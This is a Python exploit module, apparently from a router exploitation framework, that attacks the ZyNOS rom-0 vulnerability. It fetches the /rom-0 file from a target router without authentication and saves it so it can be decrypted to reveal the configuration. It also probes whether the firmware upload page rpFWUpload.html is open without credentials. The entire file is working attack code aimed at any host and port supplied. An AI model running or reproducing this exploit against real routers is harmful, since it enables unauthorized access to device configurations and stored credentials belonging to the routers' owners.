# Name:ZyNOS rom-0 config file download
# File:rom-0.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 9.2.2014
# Last modified: 9.2.2014
# Shodan Dork:
# Description: Exploits rom-0 vulnerability in ZyNOS, downloads rom-0 file that can be decrypted to obtain config file
#             also checks if FWUpload.html is accessible without credentials

import core.Exploit
import core.io

import requests
from interface.messages import print_error, print_success, print_failed, print_info


class Exploit(core.Exploit.RextExploit):
    """
Name:ZyNOS rom-0 config file download
File:rom-0.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 9.2.2014
Description: Exploits rom-0 vulnerability in ZyNOS, downloads rom-0 file that can be decrypted to obtain config file
    also checks if FWUpload.html is accessible without credentials

Options:
    Name        Description

    host        Target host address
    port        Target port
    """
    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        target = "http://" + self.host + ":" + self.port
        try:
            response = requests.get(target + "/rom-0", timeout=60)
            content_type = 'application/octet-stream'
            if response.status_code == requests.codes.ok and response.headers.get('Content-Type') == content_type:
                print_success("got rom-0 file, size:" + str(len(response.content)))
                core.io.writefile(response.content, "rom-0")
            else:
                print_error("failed")
            print_info("Checking if rpFWUpload.html is available")
            response = requests.get(target + "/rpFWUpload.html", timeout=60)
            if response.status_code == requests.codes.ok:
                print_success("rpFWUpload.html is accessible")
            else:
                print_failed("rpFWUpload.html is not accessible")
        except requests.RequestException:
            print_error("timeout!")

Exploit()
